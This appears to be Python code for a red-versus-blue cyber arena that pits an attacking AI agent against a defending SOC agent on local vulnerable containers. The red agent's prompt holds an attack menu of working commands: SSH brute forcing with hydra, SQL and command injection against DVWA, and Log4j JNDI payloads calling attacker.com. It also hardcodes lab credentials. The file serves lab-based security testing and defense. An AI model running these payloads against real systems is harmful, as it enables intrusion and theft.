"""Agent builders for the CyberOrion arena."""

from __future__ import annotations

import json
import os
import time
import uuid

from cai.sdk.agents import Agent, OpenAIChatCompletionsModel
from openai import AsyncOpenAI

from .tools import (
    scan_services, inspect_target,
    audit_web_app, harden_web_app,
    audit_ssh, harden_ssh,
    manage_firewall, inspect_network,
    exec_command, report_vuln,
    check_auth_log, check_web_log,
    check_network_connections, check_file_integrity,
    check_process_anomaly,
)
from .tools._common import TOOL_CALL_LOG


def _model():
    model_name = os.getenv("CAI_MODEL", "openai/MiniMax-M3")
    api_key = os.getenv("OPENAI_API_KEY", "missing-key")
    base_url = os.getenv("OPENAI_API_BASE") or os.getenv("OPENAI_BASE_URL")
    client_kwargs = {"api_key": api_key, "timeout": 60.0, "max_retries": 1}
    if base_url:
        client_kwargs["base_url"] = base_url
    return OpenAIChatCompletionsModel(
        model=model_name, openai_client=AsyncOpenAI(**client_kwargs),
    )


def _patch_function_tool_logging(tool, tool_name=""):
    name = tool_name or getattr(tool, "name", "unknown")
    if getattr(tool, "_cyberorion_tracked", False):
        return
    original = tool.on_invoke_tool
    async def tracked(ctx, args_json_str):
        cid = uuid.uuid4().hex[:8]
        try:
            args = json.loads(args_json_str) if args_json_str else {}
        except Exception:
            args = {"raw": args_json_str[:500]}
        rec = {"call_id": cid, "tool": name, "args": args, "status": "running",
               "started_at": time.time(), "ended_at": None, "duration_ms": None,
               "result": None, "error": None}
        TOOL_CALL_LOG.append(rec)
        t0 = time.perf_counter()
        try:
            result = await original(ctx, args_json_str)
            rec["status"] = "ok"
            if isinstance(result, str):
                rec["result"] = result[:2000] if len(result) > 2000 else result
            else:
                rec["result"] = str(result)[:2000]
            return result
        except Exception as exc:
            rec["status"] = "error"
            rec["error"] = f"{type(exc).__name__}: {exc}"
            raise
        finally:
            dt = (time.perf_counter() - t0) * 1000.0
            rec["ended_at"] = time.time()
            rec["duration_ms"] = round(dt, 1)
    tool.on_invoke_tool = tracked
    tool._cyberorion_tracked = True


def build_red_agent() -> Agent:
    from cai.tools.reconnaissance.generic_linux_command import generic_linux_command
    _patch_function_tool_logging(generic_linux_command, "generic_linux_command")
    tools = [generic_linux_command]
    try:
        from cai.tools.reconnaissance.exec_code import execute_code
        _patch_function_tool_logging(execute_code, "execute_code")
        tools.append(execute_code)
    except Exception:
        pass
    return Agent(
        name="Red Team Agent",
        instructions=_RED_INSTRUCTIONS,
        tools=tools,
        model=_model(),
    )


_RED_INSTRUCTIONS = """You are the RED TEAM in a red-vs-blue cyber arena.
Your job: attack the targets and demonstrate real exploits so the blue
agent (CyberOrion) has something to defend against.

TARGETS (use localhost with mapped ports):
- DVWA web app: http://localhost:28080  (login: admin / password)
- Weak-SSH host: localhost:22222  (creds: user:user, admin:admin123, ctf:ctf. Flag at /home/ctf/flag.txt)
- Log4j/Solr: http://localhost:8983  (CVE-2021-44228, JNDI injection via HTTP header/param)
IMPORTANT: ALWAYS use localhost with mapped ports. Container internal IPs are NOT reachable from WSL host.

RULES OF ENGAGEMENT:
1. Pick ONE target per turn and execute ONE concrete attack step.
2. Use the generic_linux_command tool to actually run commands.
   nmap, curl, hydra, sqlmap, sshpass are all fair game.
3. After each step, summarise in 2-3 lines:
   - what you attacked
   - the command you ran
   - the result (success / failure / what you learned)
4. Do NOT attempt to defend or patch anything. Stay offensive.
5. Be efficient: one round = one attack step.

THINK DEEPLY before each action: OBSERVATION -> ANALYSIS -> STRATEGY -> EXPECTATION. Be adaptive. If one attack fails, pivot to another.
"""

def build_cyberorion() -> Agent:
    tools = [
        scan_services, inspect_target,
        audit_web_app, harden_web_app,
        audit_ssh, harden_ssh,
        manage_firewall, inspect_network,
        exec_command, report_vuln,
        check_auth_log, check_web_log,
        check_network_connections, check_file_integrity,
        check_process_anomaly,
    ]
    return Agent(
        name="CyberOrion",
        instructions=_CYBERORION_INSTRUCTIONS,
        tools=tools,
        model=_model(),
    )


_CYBERORION_INSTRUCTIONS = """You are CyberOrion, an autonomous Security Operations Center (SOC).
You operate INDEPENDENTLY - you have NO knowledge of what the red team is doing.
Your job is to monitor, detect, and respond to threats using your own tools.

TARGETS (use docker exec to inspect, use container names):
- DVWA: container cyberorion_dvwa (172.29.0.10:80). Web app with configurable security.
- SSH: container cyberorion_weak_ssh (172.29.0.12:22). SSH service with auth logs.
- Log4j/Solr: container cyberorion_log4j (172.29.0.20:8983). Vulnerable to JNDI injection.

YOUR 15 TOOLS (organized in 6 categories):
  Recon:     scan_services, inspect_target
  Web:       audit_web_app, harden_web_app
  SSH:       audit_ssh, harden_ssh
  Network:   manage_firewall, inspect_network
  Response:  exec_command, report_vuln
  SOC:       check_auth_log, check_web_log, check_network_connections,
             check_file_integrity, check_process_anomaly

CRITICAL OPERATING PRINCIPLE:
  You do NOT know what the red team is doing. You must DISCOVER attacks yourself.
  Only respond to threats you actually detect in logs, network, or files.
  If you detect NOTHING, do NOT harden anything - that would be a false positive.
  Your SOC tools (check_auth_log, check_web_log, etc.) are your eyes and ears.

WORKFLOW (patrol every round):
  1. PATROL: Use SOC tools to check for attacks (auth logs, web logs, network, files, processes).
  2. ANALYZE: Based on what you found, determine if there is a real threat.
  3. RESPOND: If you detected a real attack, harden the affected service.
  4. RECORD: Call report_vuln() to record what you found and what you did.

RULES: One tool per step. Only respond to REAL threats. THINK DEEPLY:
OBSERVATION (what am I checking?) -> ANALYSIS (what do the results show?)
-> DECISION (is this a real threat?) -> EXPECTATION (what should I do?)."""


def build_red_turn_prompt(round_num, prev_red_summary, blue_summary=""):
    blue_context = ""
    if blue_summary:
        blue_context = (
            "\n\n=== BLUE TEAM last defense (round " + str(round_num - 1) + ") ===\n" + blue_summary + "\n"
            "ADAPT YOUR STRATEGY based on what the blue team did:\n"
            "- If they hardened DVWA, PIVOT to SSH or Log4j attacks.\n"
            "- If they hardened SSH, PIVOT to DVWA or Log4j attacks.\n"
            "- If they hardened Log4j, PIVOT to DVWA or SSH attacks.\n"
            "- If they only detected (no hardening), PRESS YOUR ADVANTAGE.\n"
        )
    return (
        "=== ROUND " + str(round_num) + " === RED TEAM TURN ===\n"
        "PREVIOUS ROUND SUMMARY:\n" + (prev_red_summary or "(first round - no history yet)")
        + blue_context + "\n\n"
        "TARGETS (use EXACTLY these addresses from the WSL host):\n"
        "  - DVWA: http://localhost:28080  (login: admin / password)\n"
        "  - SSH:  localhost:22222         (creds: user:user, admin:admin123, ctf:ctf)\n"
        "  - Log4j: http://localhost:8983  (Apache Solr, CVE-2021-44228)\n"
        "  Flag: /home/ctf/flag.txt (read via SSH for a CONFIRMED WIN!)\n\n"
        "ATTACK MENU (pick something DIFFERENT from previous rounds):\n"
        "  1. SSH flag: sshpass -p ctf ssh -o StrictHostKeyChecking=no -p 22222 ctf@localhost \"cat /home/ctf/flag.txt\"\n"
        "  2. SSH brute: hydra -l ctf -p ctf -f ssh://localhost:22222 -t 4\n"
        "  3. DVWA SQLi: curl -s -b \"security=low\" \"http://localhost:28080/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit\"\n"
        "  4. DVWA CmdInj: curl -s -b \"security=low\" \"http://localhost:28080/vulnerabilities/exec/?ip=;id&Submit=Submit\"\n"
        "  5. Log4j JNDI: curl -s -H \"X-Api-Version: ${jndi:ldap://attacker.com/a}\" http://localhost:8983/solr/admin/cores\n"
        "  6. Log4j param: curl -s \"http://localhost:8983/solr/admin/cores?action=${jndi:ldap://attacker.com/a}\"\n"
        "  7. Nmap scan: nmap -sV -p 22222,28080,8983 localhost\n"
        "  8. DVWA login: curl -s -c /tmp/cj -b /tmp/cj -L http://localhost:28080/login.php\n\n"
        "RULES:\n"
        "  - For DVWA, you MUST first authenticate to get a valid PHPSESSID cookie.\n"
        "  - SSH with sshpass is the FASTEST path to reading the flag.\n"
        "  - Log4j targets the Solr admin API at port 8983.\n\n"
        "THINK DEEPLY (show FULL reasoning, 4-5 sentences):\n"
        "  OBSERVATION -> ANALYSIS -> STRATEGY -> DECISION -> EXPECTATION\n"
        "Then use generic_linux_command to run the attack. Report with SUCCESS/FAILURE verdict."
    )



def build_blue_turn_prompt(round_num, ledger_snapshot):
    """Build the blue team turn prompt.

    NOTE: The blue team does NOT receive any information about what the red team did.
    Blue team is an independent SOC that discovers attacks through its own detection
    tools (check_auth_log, check_web_log, check_network_connections, etc.).
    """
    ledger_lines = []
    for vid, entry in (ledger_snapshot or {}).items():
        status = entry.get("status", "?")
        ev = (entry.get("evidence") or "")[:80]
        ledger_lines.append("  - " + vid + ": " + status + " | " + ev)
    ledger_str = "\n".join(ledger_lines) if ledger_lines else "  (empty - no detections yet)"

    return (
        "=== ROUND " + str(round_num) + " === BLUE TEAM (CyberOrion) SOC PATROL ===\n"
        "You are the Security Operations Center. You have NO knowledge of what the red team is doing.\n"
        "Your job is to INDEPENDENTLY monitor, detect, and respond to threats.\n\n"
        "YOUR DETECTION LEDGER (what you have found so far):\n" + ledger_str + "\n\n"
        "PATROL WORKFLOW - check ALL targets for signs of attack using SOC tools:\n"
        "  1. check_auth_log('ssh')       - scan SSH auth logs for brute-force attempts\n"
        "  2. check_web_log('dvwa')       - scan DVWA web logs for SQLi/XSS/cmd injection\n"
        "  3. check_web_log('log4j')      - scan Solr logs for JNDI injection attempts\n"
        "  4. check_network_connections('dvwa') - check for suspicious reverse shells / listeners\n"
        "  5. check_file_integrity('dvwa') - check for file tampering or webshells\n"
        "  6. check_process_anomaly('ssh') - check for suspicious processes (reverse shell, miner)\n"
        "  7. audit_web_app('all')        - baseline check of DVWA security posture\n"
        "  8. audit_ssh()                 - baseline check of SSH config\n\n"
        "RESPONSE RULES (CRITICAL - this is what makes you a real SOC):\n"
        "  - If you DETECT attacks in logs (failed logins, SQLi, JNDI, etc.): harden the affected service.\n"
        "  - If you detect a brute-force in auth_log -> harden_ssh('disable_password') + manage_firewall('block')\n"
        "  - If you detect SQLi/cmd-inj in web_log -> harden_web_app('impossible')\n"
        "  - If you detect JNDI in log4j web_log -> manage_firewall('block') the source IP\n"
        "  - If you detect a webshell via file_integrity -> exec_command to remove it\n"
        "  - If you detect NOTHING abnormal, do NOT harden anything (avoid false positives / alert fatigue).\n"
        "  - After patrol + response, call report_vuln() to record what you found and what you did.\n\n"
        "THINK DEEPLY before each tool call (show FULL reasoning, 4-5 sentences):\n"
        "  OBSERVATION: What am I checking? What does the log/output show?\n"
        "  ANALYSIS:    Is this a real attack signal or normal traffic? What is the confidence level?\n"
        "  DECISION:    Should I respond? If yes, which hardening tool and why? If no, why not?\n"
        "  EXPECTATION: What should the system look like AFTER my action? How will I verify?\n"
        "Be precise. Only respond to REAL threats you detect with evidence. An empty patrol is valid."
    )


